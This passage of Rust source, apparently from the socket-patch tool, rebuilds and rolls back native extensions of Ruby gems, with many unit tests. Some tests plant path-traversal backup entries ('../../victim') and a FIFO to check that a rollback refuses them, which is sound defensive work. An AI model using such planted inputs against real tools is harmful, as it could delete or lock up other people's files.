             {} --extensions`.\n{diagnostic}",
            gem_name_of(&copy.full_name)
        )
    })?;
    let _ = tokio::fs::remove_file(copy.gem_dir.join(MARKER_FILE)).await;
    Ok(true)
}

/// Rebuild `copy`'s extension from its source gem as it shipped (no record
/// over it), for a rollback that has no backup of the original build.
/// `Err` when it cannot be built from the source gem
/// ([`build_from_source_gem`]): the in-place rebuild is what is left, and
/// the error holds what the staged build showed of the gem's build
/// ([`StageFailure::InTree`]), for [`rebuild`] to go by.
async fn rebuild_unpatched_from_source_gem(
    copy: &GemCopy,
    probe: &Probe,
    env: &RubyEnv,
) -> Result<Result<(), String>, SeenInStage> {
    let spec_text = crate::utils::fs::read_regular_to_string(&copy.spec_path)
        .await
        .map_err(|_| SeenInStage::default())?;
    let facts = SpecFacts::of(&spec_text, &copy.full_name);
    let source = facts
        .release
        .filter(|_| facts.extensions.declared)
        .ok_or_else(SeenInStage::default)?;
    let gems = GemSource::of(&env.cwd, env.offline).await;
    let archive = gems
        .archive(&copy.home, &source)
        .await
        .map_err(|_| SeenInStage::default())?;
    let (stage, built) =
        match build_from_source_gem(copy, probe, &source, archive, &gems, env, None).await {
            Ok(staged) => staged,
            Err(StageFailure::Busy(why)) => return Ok(Err(why)),
            Err(StageFailure::InTree { seen, .. }) => return Err(seen),
            Err(_) => return Err(SeenInStage::default()),
        };
    let moved_in = {
        let (copy, probe) = (copy.clone(), probe.clone());
        crate::utils::fs::run_blocking(move || {
            let scope = NativeScope::default();
            install_staged_build(&copy, &probe, &scope, &HashMap::new(), &built, None)
        })
        .await
    };
    close_stage(stage, copy).await;
    Ok(moved_in)
}

/// Put the backed-up original build back over socket-patch's build, then
/// drop the marker and the backup. For a gem RubyGems built, the extension
/// dir the backup names must be this gem's under the home
/// ([`confined_ext_dir`]) and no symlink, or nothing is touched. For a
/// precompiled copy the backup holds its prebuilt binaries, which go back
/// where they were under the gem dir, bytes and mode.
fn restore_backup(copy: &GemCopy, marker: Option<&BuildMarker>) -> std::io::Result<()> {
    let backup = copy.gem_dir.join(BACKUP_DIR);
    let info: BackupInfo =
        serde_json::from_slice(&read_regular_to_bytes_sync(&backup.join(BACKUP_INFO))?)
            .map_err(std::io::Error::other)?;
    let restore_lib_files = || -> std::io::Result<()> {
        for lib in &info.lib_files {
            if !is_safe_relative_subpath(lib) {
                continue;
            }
            let saved = backup.join("lib").join(lib);
            let bytes = read_regular_to_bytes_sync(&saved)?;
            let perms = std::fs::symlink_metadata(&saved)?.permissions();
            // With the mode the backup kept.
            replace_file(&copy.gem_dir.join(lib), |stage| {
                std::fs::write(stage, &bytes)?;
                std::fs::set_permissions(stage, perms)
            })?;
        }
        Ok(())
    };
    if info.grafted {
        restore_lib_files()?;
    } else {
        let ext_dir = confined_ext_dir(copy, &info.extension_dir).ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!(
                    "the backup names {:?}, which is not this gem's extension dir under {}",
                    info.extension_dir,
                    copy.home.display()
                ),
            )
        })?;
        // It is emptied and refilled by path.
        refuse_link(&ext_dir, "this gem's extension dir")?;
        // socket-patch's lib copies go; the originals come back.
        for lib in marker.iter().flat_map(|m| m.lib_artifacts.keys()) {
            if is_safe_relative_subpath(lib) && !info.lib_files.contains(lib) {
                let _ = std::fs::remove_file(copy.gem_dir.join(lib));
            }
        }
        // So does what an in-place build added to the gem's own tree.
        for created in &info.created_files {
            if is_safe_relative_subpath(created) && !is_own_entry(created) {
                let _ = std::fs::remove_file(copy.gem_dir.join(created));
            }
        }
        remove_dir_if_exists(&ext_dir)?;
        if info.had_extension_dir {
            copy_tree_sync(&backup.join("ext"), &ext_dir)?;
        }
        restore_lib_files()?;
    }
    match std::fs::remove_file(copy.gem_dir.join(MARKER_FILE)) {
        Err(e) if e.kind() != std::io::ErrorKind::NotFound => return Err(e),
        _ => {}
    }
    remove_dir_if_exists(&backup)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn info(after: &str) -> PatchFileInfo {
        PatchFileInfo {
            before_hash: "b".repeat(64),
            after_hash: after.to_string(),
        }
    }

    fn files(keys: &[&str]) -> HashMap<String, PatchFileInfo> {
        keys.iter()
            .map(|k| (k.to_string(), info(&"a".repeat(64))))
            .collect()
    }

    /// What the gemspec of a gem RubyGems builds says: the `ruby` platform,
    /// `lib` as its require path, and `scripts` as its extensions.
    fn built_gem(scripts: &[&str]) -> SpecFacts {
        SpecFacts {
            extensions: ExtensionDecl {
                declared: true,
                entries: scripts.iter().map(|s| s.to_string()).collect(),
            },
            require_paths: vec!["lib".to_string()],
            ..SpecFacts::default()
        }
    }

    #[test]
    fn parses_to_ruby_extensions() {
        let spec = "Gem::Specification.new do |s|\n  s.name = \"json\".freeze\n  \
                    s.extensions = [\"ext/json/ext/generator/extconf.rb\".freeze, \
                    \"ext/json/ext/parser/extconf.rb\".freeze]\nend\n";
        let decl = parse_extensions(spec);
        assert!(decl.declared);
        assert_eq!(
            decl.entries,
            vec![
                "ext/json/ext/generator/extconf.rb",
                "ext/json/ext/parser/extconf.rb"
            ]
        );
    }

    #[test]
    fn ignores_comments_comparisons_and_empty_lists() {
        for spec in [
            "# s.extensions = [\"ext/a/extconf.rb\"]\n",
            "raise if s.extensions == [\"e\"]\n",
            "s.extensions_dir = \"x\"\n",
        ] {
            assert!(!parse_extensions(spec).declared, "{spec}");
        }
        // The vendored backend's test, `.push` / `.concat` included.
        let pushed = parse_extensions("s.extensions.push(\"ext/a/extconf.rb\")\n");
        assert!(pushed.declared);
        assert_eq!(pushed.entries, vec!["ext/a/extconf.rb"]);
        let decl = parse_extensions("s.extensions = EXTS\n");
        assert!(decl.declared);
        assert!(decl.entries.is_empty());
    }

    #[test]
    fn native_by_name_follows_the_issue_list() {
        for path in [
            "ext/json/ext/parser/parser.c",
            "ext/a/a.h",
            "src/x.CPP",
            "ext/a/a.hh",
            "ext/a/a.m",
            "lib/parser.y",
            "ext/a/lexer.rl",
            "ext/a/extconf.rb",
            "extconf.rb",
            "ext/a/depend",
        ] {
            assert!(is_native_by_name(path), "{path}");
        }
        for path in ["lib/a.rb", "depend", "README.md", "ext/a/.c", "lib/c"] {
            assert!(!is_native_by_name(path), "{path}");
        }
    }

    #[test]
    fn classify_counts_files_under_declared_script_dirs() {
        let decl = built_gem(&["ext/foo/Cargo.toml"]);
        let scope = classify(
            &decl,
            &files(&["ext/foo/src/lib.rs", "lib/foo.rb", "package/ext/foo/x.c"]),
        );
        assert_eq!(
            scope.inputs,
            vec!["ext/foo/src/lib.rs", "package/ext/foo/x.c"]
        );
        assert!(scope.builds_extensions);
    }

    #[test]
    fn classify_without_extensions_keeps_c_but_drops_grammars() {
        let scope = classify(
            &SpecFacts::default(),
            &files(&["lib/parser.y", "lib/parser.rb", "ext/x.c"]),
        );
        assert_eq!(scope.inputs, vec!["ext/x.c"]);
        assert!(!scope.builds_extensions);
        let ruby_only = classify(&SpecFacts::default(), &files(&["lib/parser.y"]));
        assert!(ruby_only.inputs.is_empty());
    }

    /// Non-compiled C / Objective-C files outside `ext/` in a gem that builds
    /// nothing (templates, fixtures) are plain files.
    #[test]
    fn classify_without_extensions_ignores_c_outside_ext() {
        let scope = classify(
            &SpecFacts::default(),
            &files(&["lib/templates/App.m", "test/fixtures/a.c", "lib/a.h"]),
        );
        assert!(scope.inputs.is_empty());
    }

    /// A root-level script makes the files beside it inputs, not `lib/`.
    #[test]
    fn classify_root_level_script_counts_top_level_files_only() {
        let decl = built_gem(&["extconf.rb"]);
        let scope = classify(&decl, &files(&["extconf.rb", "foo.c", "lib/foo.rb"]));
        assert_eq!(scope.inputs, vec!["extconf.rb", "foo.c"]);
    }

    #[test]
    fn confined_ext_dir_only_names_this_gems_dir_under_home() {
        let copy = GemCopy::of(Path::new("/h/gems/a-1")).unwrap();
        assert_eq!(
            confined_ext_dir(&copy, "extensions/p/3.4.0/a-1"),
            Some(PathBuf::from("/h/extensions/p/3.4.0/a-1"))
        );
        for bad in [
            "/home/ci",
            "../../../..",
            "extensions/p/3.4.0/other-1",
            "extensions/../../x/a-1",
            "extensions/p/a-1",
            "gems/p/3.4.0/a-1",
        ] {
            assert_eq!(confined_ext_dir(&copy, bad), None, "{bad}");
        }
    }

    #[test]
    fn unknown_scripts_make_ext_tree_native() {
        let decl = built_gem(&[]);
        let scope = classify(&decl, &files(&["ext/foo/build.rs", "lib/a.rb"]));
        assert_eq!(scope.inputs, vec!["ext/foo/build.rs"]);
    }

    #[test]
    fn gem_copy_needs_a_gems_dir() {
        let copy = GemCopy::of(Path::new("/h/gems/json-2.10.1")).unwrap();
        assert_eq!(copy.home, Path::new("/h"));
        assert_eq!(
            copy.spec_path,
            Path::new("/h/specifications/json-2.10.1.gemspec")
        );
        assert!(GemCopy::of(Path::new("/h/bundler/gems2/json-abc")).is_none());
    }

    /// A relative crawl root reaches Ruby (run from the project dir) and
    /// `extconf.rb` (run from the ext dir) as absolute paths, `..` dropped
    /// the way Ruby's `File.expand_path` drops it.
    #[test]
    fn gem_copy_of_a_relative_path_is_absolute() {
        let copy = GemCopy::of(Path::new("proj/../vendor/ruby/3.4.0/gems/json-2.10.1")).unwrap();
        let expected = std::env::current_dir().unwrap().join("vendor/ruby/3.4.0");
        assert_eq!(copy.home, expected);
        assert!(copy.spec_path.is_absolute());
        assert!(copy.gem_dir.is_absolute());
        assert!(!copy
            .gem_dir
            .components()
            .any(|c| c == std::path::Component::ParentDir));
    }

    #[test]
    fn gem_name_strips_version_and_platform() {
        assert_eq!(gem_name_of("json-2.10.1"), "json");
        assert_eq!(gem_name_of("ruby-prof-1.7.0"), "ruby-prof");
        assert_eq!(gem_name_of("nokogiri-1.16.0-x86_64-linux"), "nokogiri");
        assert_eq!(gem_name_of("weird"), "weird");
    }

    #[test]
    fn stderr_tail_drops_boilerplate_and_caps_lines() {
        let mut text: String = (0..30).map(|i| format!("line {i}\n")).collect();
        text.push_str("\nGem files will remain installed in /x for inspection.\n");
        let tail = stderr_tail(&text);
        assert!(tail.starts_with("line 0\n"));
        assert!(tail.ends_with("line 29"));
        let long: String = (0..45).map(|i| format!("line {i}\n")).collect();
        let tail = stderr_tail(&long);
        assert!(tail.starts_with("line 15\n"));
        assert!(tail.ends_with("line 44"));
        assert_eq!(
            stderr_tail(""),
            "the build exited with an error and no output"
        );
    }

    /// #2117: for a failed `extconf.rb` the last lines of the output are
    /// mkmf's list of configuration options and a pointer to an `mkmf.log`
    /// that is removed with the failed build; the cause comes before both.
    #[test]
    fn stderr_tail_keeps_the_cause_of_a_failed_extconf() {
        let mut text = String::from(
            "ERROR: Failed to build gem native extension.\n\n\
             checking for libpq-fe.h... no\n\
             Can't find the 'libpq-fe.h header\n\
             \x20 sudo apt install libpq-dev\n\
             *** extconf.rb failed ***\n\
             Could not create Makefile due to some reason, probably lack of necessary\n\
             libraries and/or headers.  Check the mkmf.log file for more details.  You may\n\
             need configuration options.\n\n\
             Provided configuration options:\n",
        );
        for i in 0..40 {
            text.push_str(&format!("\t--with-opt-{i}\n"));
        }
        text.push_str(
            "\nTo see why this extension failed to compile, please check the mkmf.log which \
             can be found here:\n\n  /home/.socket-patch-build/pg-1.6.2/home/extensions/x/3.3.0/\
             pg-1.6.2/mkmf.log\n\nextconf failed, exit code 1\n\n\
             Gem files will remain installed in /x for inspection.\n\
             Results logged to /x/gem_make.out\n",
        );
        let tail = stderr_tail(&text);
        assert_eq!(
            tail,
            "ERROR: Failed to build gem native extension.\n\
             checking for libpq-fe.h... no\n\
             Can't find the 'libpq-fe.h header\n\
             \x20 sudo apt install libpq-dev\n\
             *** extconf.rb failed ***\n\
             Could not create Makefile due to some reason, probably lack of necessary\n\
             libraries and/or headers.  Check the mkmf.log file for more details.  You may\n\
             need configuration options.\n\
             extconf failed, exit code 1"
        );
    }

    /// Only mkmf's own block is dropped: tab-indented lines elsewhere (a
    /// Ruby backtrace, `make` output) stay, and so does a line after the
    /// pointer that is not the log's path.
    #[test]
    fn stderr_tail_keeps_indented_lines_outside_the_option_list() {
        let text = "extconf.rb:5:in `rename': No such file (Errno::ENOENT)\n\
                    \tfrom extconf.rb:5:in `<main>'\n\
                    Provided configuration options:\n\
                    \t--with-opt-dir\n\
                    make: *** [Makefile:245: pg.o] Error 1\n\
                    \tcompilation terminated.\n\
                    To see why this extension failed to compile, please check the mkmf.log \
                    which can be found here:\n\
                    make failed, exit code 2\n";
        assert_eq!(
            stderr_tail(text),
            "extconf.rb:5:in `rename': No such file (Errno::ENOENT)\n\
             \tfrom extconf.rb:5:in `<main>'\n\
             make: *** [Makefile:245: pg.o] Error 1\n\
             \tcompilation terminated.\n\
             make failed, exit code 2"
        );
    }

    #[test]
    fn probe_output_parses() {
        assert_eq!(
            parse_extensions_dir(
                "warning: a shim talking\nother\tline\nsp_extensions_dir\t/h/extensions/p/3.4.0\n"
            ),
            Some(PathBuf::from("/h/extensions/p/3.4.0"))
        );
        for unreadable in ["", "sp_gem_dir\t/x\n", "sp_extensions_dir\t\n"] {
            assert_eq!(parse_extensions_dir(unreadable), None, "{unreadable:?}");
        }
    }

    fn first_require_path(spec_text: &str) -> Option<String> {
        parse_require_paths(spec_text).and_then(|paths| paths.into_iter().next())
    }

    /// The require path is read from the `to_ruby` text RubyGems installs,
    /// stub comment and all, and defaults to RubyGems' `lib`.
    #[test]
    fn require_path_is_read_from_the_gemspec_text() {
        let to_ruby = "# -*- encoding: utf-8 -*-\n# stub: a 1 ruby other\n\n\
                       Gem::Specification.new do |s|\n  s.name = \"a\".freeze\n  \
                       s.require_paths = [\"ext/lib\".freeze, \"lib\".freeze]\nend\n";
        assert_eq!(first_require_path(to_ruby).as_deref(), Some("ext/lib"));
        for (spec, expected) in [
            ("s.require_paths = ['lib']\n", Some("lib")),
            ("s.name = \"a\"\n", Some("lib")),
            ("# s.require_paths = [\"x\"]\n", Some("lib")),
            ("raise if s.require_paths == [\"x\"]\n", Some("lib")),
            ("s.require_paths_extra = [\"x\"]\n", Some("lib")),
            ("s.require_paths = PATHS\n", None),
        ] {
            assert_eq!(first_require_path(spec).as_deref(), expected, "{spec}");
        }
    }

    /// A gem copy with an installed extension dir and a to_ruby gemspec.
    fn installed_gem(home: &Path, require_path: &str) -> GemCopy {
        let gem_dir = home.join("gems/a-1");
        std::fs::create_dir_all(gem_dir.join("lib")).unwrap();
        std::fs::create_dir_all(home.join("extensions/p/3.4.0/a-1")).unwrap();
        std::fs::create_dir_all(home.join("specifications")).unwrap();
        std::fs::write(
            home.join("specifications/a-1.gemspec"),
            format!(
                "Gem::Specification.new do |s|\n  s.name = \"a\".freeze\n  \
                 s.require_paths = [\"{require_path}\".freeze]\n  \
                 s.extensions = [\"ext/a/extconf.rb\".freeze]\nend\n"
            ),
        )
        .unwrap();
        GemCopy::of(&gem_dir).unwrap()
    }

    /// A stand-in `ruby` that answers the extensions-dir question with
    /// `<home>/extensions/<platform>/3.4.0` and records its arguments.
    #[cfg(unix)]
    fn fake_ruby(dir: &Path, platform: &str) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let ruby = dir.join("ruby");
        std::fs::write(
            &ruby,
            format!(
                "#!/bin/sh\nprintf '%s\\n' \"$3 $4\" >> '{}'\n\
                 printf 'sp_extensions_dir\\t%s\\n' \"$4/extensions/{platform}/3.4.0\"\n",
                dir.join("calls").display()
            ),
        )
        .unwrap();
        std::fs::set_permissions(&ruby, std::fs::Permissions::from_mode(0o755)).unwrap();
        ruby
    }

    /// [`find_ruby`] over a script written a moment ago: a sibling test
    /// forking in between holds its write fd until it execs, and the spawn
    /// fails with ETXTBSY (os error 26) for that long.
    #[cfg(unix)]
    async fn find_fresh_ruby(
        copy: &GemCopy,
        env: &RubyEnv,
        preflight: &Preflight,
    ) -> Result<Probe, String> {
        loop {
            match find_ruby(copy, env, preflight.clone(), None).await {
                Err(why) if why.contains("os error 26") => {
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
                found => return found,
            }
        }
    }

    /// The Ruby is matched to the install by where it builds extensions for
    /// the gem home, a question that names no file of the gem, and the lib
    /// dir comes from the gemspec's text.
    #[cfg(unix)]
    #[tokio::test]
    async fn find_ruby_asks_only_for_the_extensions_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        let bin = tmp.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let ruby = fake_ruby(&bin, "p");
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        let mut preflight = Preflight {
            installed: installed_extension_dirs(&copy),
            candidates: vec![ruby.clone()],
            require_paths: vec!["lib".to_string()],
        };
        assert_eq!(preflight.installed, [home.join("extensions/p/3.4.0/a-1")]);

        let probe = find_fresh_ruby(&copy, &env, &preflight).await.unwrap();
        assert_eq!(probe.ruby, ruby);
        assert_eq!(probe.extension_dir, home.join("extensions/p/3.4.0/a-1"));
        assert_eq!(probe.lib_dir, copy.gem_dir.join("lib"));
        assert_eq!(lib_rel(&probe, "a/a.so").as_deref(), Some("lib/a/a.so"));
        assert_eq!(
            std::fs::read_to_string(bin.join("calls")).unwrap(),
            format!("extensions_dir {}\n", home.display()),
            "the probe names the gem home, not the gemspec"
        );

        // A Ruby of another platform builds elsewhere: not the owner.
        let other = tmp.path().join("other");
        std::fs::create_dir_all(&other).unwrap();
        preflight.candidates = vec![fake_ruby(&other, "q")];
        let why = find_fresh_ruby(&copy, &env, &preflight).await.unwrap_err();
        assert!(why.contains("another Ruby's"), "{why}");
    }

    /// A gem with no extension dir, or whose require path leaves the gem
    /// dir (lib copies are only ever written inside the gem), is refused
    /// from its files, before a Ruby is looked for.
    #[tokio::test]
    async fn preflight_refuses_from_files_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        for require_path in ["../../elsewhere", "/abs"] {
            let home = tmp.path().join(require_path.replace(['/', '.'], "_"));
            let copy = installed_gem(&home, require_path);
            let why = rebuild_preflight(&copy, &env, false).await.unwrap_err();
            assert!(why.contains("require path"), "{require_path}: {why}");
        }
        let home = tmp.path().join("unbuilt");
        let copy = installed_gem(&home, "lib");
        std::fs::remove_dir_all(home.join("extensions")).unwrap();
        let why = rebuild_preflight(&copy, &env, false).await.unwrap_err();
        assert!(why.contains("no compiled extension dir"), "{why}");
    }

    /// A rebuild interrupted before RubyGems created the new extension dir
    /// leaves the install-time build parked beside where it was. That gem
    /// is not one "installed by a RubyGems older than 2.2": its build is
    /// there to put back.
    #[tokio::test]
    async fn a_parked_build_is_not_a_missing_one() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        let ext = home.join("extensions/p/3.4.0/a-1");
        std::fs::rename(&ext, ext.with_file_name(".a-1.socket-patch-old")).unwrap();
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        // Without a `ruby` on PATH the preflight still refuses, for that.
        match rebuild_preflight(&copy, &env, false).await {
            Ok(preflight) => assert_eq!(preflight.installed, [ext]),
            Err(why) => assert!(why.contains("no `ruby` was found"), "{why}"),
        }
    }

    /// A gem whose rebuild was cut short: the install-time build parked
    /// beside the extension dir, and whatever `left` says the build got to
    /// in the extension dir and the `lib/` copy.
    fn interrupted_gem(home: &Path, left: Option<(&str, bool)>) -> (GemCopy, PathBuf, PathBuf) {
        let copy = installed_gem(home, "lib");
        let ext = home.join("extensions/p/3.4.0/a-1");
        let parked = ext.with_file_name(".a-1.socket-patch-old");
        std::fs::create_dir_all(ext.join("a")).unwrap();
        std::fs::write(ext.join("a/a.so"), b"original").unwrap();
        std::fs::write(ext.join(BUILD_COMPLETE), b"").unwrap();
        std::fs::create_dir_all(copy.gem_dir.join("lib/a")).unwrap();
        std::fs::write(copy.gem_dir.join("lib/a/a.so"), b"original").unwrap();
        std::fs::rename(&ext, &parked).unwrap();
        if let Some((bytes, complete)) = left {
            std::fs::create_dir_all(ext.join("a")).unwrap();
            std::fs::write(ext.join("a/a.so"), bytes).unwrap();
            std::fs::write(copy.gem_dir.join("lib/a/a.so"), bytes).unwrap();
            if complete {
                std::fs::write(ext.join(BUILD_COMPLETE), b"").unwrap();
            }
        }
        (copy, ext, parked)
    }

    /// The parked build goes back where it was, with the `lib/` copy the
    /// interrupted build replaced, whether that build had created the
    /// extension dir yet or not. A second call finds nothing to do.
    #[test]
    fn an_interrupted_rebuild_is_put_back() {
        for left in [None, Some(("half-built", false))] {
            let tmp = tempfile::tempdir().unwrap();
            let (copy, ext, parked) = interrupted_gem(tmp.path(), left);
            assert!(
                recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap(),
                "{left:?}"
            );
            assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"original");
            assert!(ext.join(BUILD_COMPLETE).is_file(), "{left:?}");
            assert_eq!(
                std::fs::read(copy.gem_dir.join("lib/a/a.so")).unwrap(),
                b"original",
                "{left:?}"
            );
            assert!(!parked.exists(), "{left:?}");
            assert!(!recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        }
    }

    /// A build that finished (the run died before recording it, or `gem
    /// pristine` ran since) is not traded for the older parked one.
    #[test]
    fn a_finished_build_stands_over_a_parked_one() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, ext, parked) = interrupted_gem(tmp.path(), Some(("rebuilt", true)));
        assert!(recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"rebuilt");
        assert_eq!(
            std::fs::read(copy.gem_dir.join("lib/a/a.so")).unwrap(),
            b"rebuilt"
        );
        assert!(!parked.exists());
    }

    /// A parked build another process still holds belongs to a rebuild
    /// that is running, not to an interrupted one: it is left alone.
    #[cfg(unix)]
    #[test]
    fn a_rebuild_still_running_elsewhere_is_left_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, ext, parked) = interrupted_gem(tmp.path(), Some(("half-built", false)));
        let held = lock_build_dir(&parked).unwrap();
        assert!(held.is_some(), "a directory can be locked here");
        let refused = recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap_err();
        assert_eq!(refused.kind(), std::io::ErrorKind::WouldBlock);
        assert!(recovery_refusal(&copy, &refused).contains("right now"));
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"half-built");
        assert_eq!(std::fs::read(parked.join("a/a.so")).unwrap(), b"original");

        // The holder gone (its process ended), the build is put back. A
        // sibling test forking right now keeps a copy of the descriptor,
        // and the lock with it, until it execs.
        drop(held);
        let recovered = loop {
            match recover_interrupted_rebuild_sync(&copy, Some("lib")) {
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(Duration::from_millis(10));
                }
                recovered => break recovered.unwrap(),
            }
        };
        assert!(recovered);
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"original");
    }

    /// Parking a build keeps what a run that dies mid-build needs: the
    /// build itself (locked while the rebuild lives) and its marker. A
    /// failed build puts the copy back as it was.
    #[test]
    fn a_parked_build_keeps_its_marker_and_goes_back_whole() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = installed_gem(tmp.path(), "lib");
        let ext = tmp.path().join("extensions/p/3.4.0/a-1");
        std::fs::create_dir_all(ext.join("a")).unwrap();
        std::fs::write(ext.join("a/a.so"), b"previous").unwrap();
        std::fs::create_dir_all(copy.gem_dir.join("lib/a")).unwrap();
        std::fs::write(copy.gem_dir.join("lib/a/a.so"), b"previous").unwrap();
        std::fs::write(copy.gem_dir.join(MARKER_FILE), b"{}").unwrap();
        let probe = Probe {
            ruby: PathBuf::from("/r"),
            gem_dir: copy.gem_dir.clone(),
            extension_dir: ext.clone(),
            require_path: "lib".to_string(),
            require_paths: vec!["lib".to_string()],
            lib_dir: copy.gem_dir.join("lib"),
            facts: None,
        };

        let aside = set_aside(&copy, &probe).unwrap();
        let parked = parked_build_path(&ext);
        assert_eq!(aside.old_ext.as_deref(), Some(parked.as_path()));
        assert!(!ext.exists() && parked.join("a/a.so").is_file());
        assert_eq!(
            std::fs::read(copy.gem_dir.join(MARKER_FILE)).unwrap(),
            b"{}"
        );
        #[cfg(unix)]
        assert_eq!(
            lock_build_dir(&parked).unwrap_err().kind(),
            std::io::ErrorKind::WouldBlock,
            "the rebuild holds its parked build"
        );

        // What a failed build leaves, then the way back.
        std::fs::create_dir_all(ext.join("a")).unwrap();
        std::fs::write(ext.join("a/a.so"), b"broken").unwrap();
        std::fs::write(copy.gem_dir.join("lib/a/a.so"), b"broken").unwrap();
        put_back(&copy, &probe, aside).unwrap();
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"previous");
        assert_eq!(
            std::fs::read(copy.gem_dir.join("lib/a/a.so")).unwrap(),
            b"previous"
        );
        assert_eq!(
            std::fs::read(copy.gem_dir.join(MARKER_FILE)).unwrap(),
            b"{}"
        );
        assert!(!parked.exists());
    }

    #[test]
    fn ruby_candidates_include_the_prefix_ruby() {
        let tmp = tempfile::tempdir().unwrap();
        let prefix = tmp.path();
        let home = prefix.join("lib/ruby/gems/3.4.0");
        std::fs::create_dir_all(home.join("gems/a-1")).unwrap();
        std::fs::create_dir_all(prefix.join("bin")).unwrap();
        let exe = if cfg!(windows) { "ruby.exe" } else { "ruby" };
        std::fs::write(prefix.join("bin").join(exe), "").unwrap();
        let copy = GemCopy::of(&home.join("gems/a-1")).unwrap();
        let elsewhere = tempfile::tempdir().unwrap();
        assert_eq!(
            ruby_candidates(&copy, elsewhere.path())[0],
            prefix.join("bin").join(exe)
        );
        // A prefix inside the scanned project is never run.
        assert!(!ruby_candidates(&copy, prefix).contains(&prefix.join("bin").join(exe)));
    }

    /// Lay down a gem whose socket-patch build replaced the backed-up
    /// install-time build (`with_marker`: the marker was written).
    fn rebuilt_gem(home: &Path, with_marker: bool) -> PathBuf {
        let gem_dir = home.join("gems/a-1");
        let ext = home.join("extensions/p/3.4.0/a-1");
        std::fs::create_dir_all(ext.join("a")).unwrap();
        std::fs::create_dir_all(gem_dir.join("lib/a")).unwrap();
        std::fs::write(ext.join("a/a.so"), b"patched").unwrap();
        std::fs::write(ext.join("a/extra.so"), b"patched").unwrap();
        std::fs::write(gem_dir.join("lib/a/a.so"), b"patched").unwrap();
        std::fs::write(gem_dir.join("lib/a/extra.so"), b"patched").unwrap();
        let backup = gem_dir.join(BACKUP_DIR);
        std::fs::create_dir_all(backup.join("ext/a")).unwrap();
        std::fs::create_dir_all(backup.join("lib/lib/a")).unwrap();
        std::fs::write(backup.join("ext/a/a.so"), b"original").unwrap();
        std::fs::write(backup.join("ext/gem.build_complete"), b"").unwrap();
        std::fs::write(backup.join("lib/lib/a/a.so"), b"original").unwrap();
        let info = BackupInfo {
            extension_dir: "extensions/p/3.4.0/a-1".into(),
            had_extension_dir: true,
            lib_files: vec!["lib/a/a.so".into()],
            ..BackupInfo::default()
        };
        std::fs::write(backup.join(BACKUP_INFO), serde_json::to_vec(&info).unwrap()).unwrap();
        if with_marker {
            let marker = BuildMarker {
                schema: MARKER_SCHEMA,
                extension_dir: "extensions/p/3.4.0/a-1".into(),
                lib_artifacts: [
                    ("lib/a/a.so".to_string(), String::new()),
                    ("lib/a/extra.so".to_string(), String::new()),
                ]
                .into(),
                ..BuildMarker::default()
            };
            std::fs::write(
                gem_dir.join(MARKER_FILE),
                serde_json::to_vec(&marker).unwrap(),
            )
            .unwrap();
        }
        gem_dir
    }

    /// A planted backup naming a dir outside this gem's extension dir is
    /// refused before anything is deleted.
    #[tokio::test]
    async fn rollback_refuses_a_backup_naming_another_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let victim = tmp.path().join("victim");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::write(victim.join("keep"), b"x").unwrap();
        let gem_dir = rebuilt_gem(&home, true);
        for label in [victim.display().to_string(), "../../victim".to_string()] {
            let info = BackupInfo {
                extension_dir: label,
                had_extension_dir: true,
                lib_files: Vec::new(),
                ..BackupInfo::default()
            };
            std::fs::write(
                gem_dir.join(BACKUP_DIR).join(BACKUP_INFO),
                serde_json::to_vec(&info).unwrap(),
            )
            .unwrap();
            let env = RubyEnv {
                cwd: home.clone(),
                rebuild: true,
                offline: true,
                progress: None,
            };
            assert!(restore_original_build(&gem_dir, &env).await.is_err());
            assert!(
                victim.join("keep").is_file(),
                "nothing outside the gem home goes"
            );
            assert!(home.join("extensions/p/3.4.0/a-1/a/a.so").is_file());
        }
    }

    /// A FIFO planted where the backup's description goes fails the
    /// rollback fast instead of blocking in open(2).
    #[cfg(unix)]
    #[tokio::test]
    async fn rollback_does_not_block_on_a_planted_fifo() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().to_path_buf();
        let gem_dir = rebuilt_gem(&home, true);
        let info = gem_dir.join(BACKUP_DIR).join(BACKUP_INFO);
        std::fs::remove_file(&info).unwrap();
        let c_path = std::ffi::CString::new(info.as_os_str().as_encoded_bytes()).unwrap();
        // SAFETY: mkfifo on a NUL-terminated path this test owns.
        assert_eq!(unsafe { libc::mkfifo(c_path.as_ptr(), 0o644) }, 0);
        let env = RubyEnv {
            cwd: home.clone(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        let restored = tokio::time::timeout(
            std::time::Duration::from_secs(10),
            restore_original_build(&gem_dir, &env),
        )
        .await
        .expect("rollback blocked on a FIFO");
        assert!(restored.is_err());
        assert_eq!(
            std::fs::read(home.join("extensions/p/3.4.0/a-1/a/a.so")).unwrap(),
            b"patched",
            "nothing was changed"
        );
    }

    #[tokio::test]
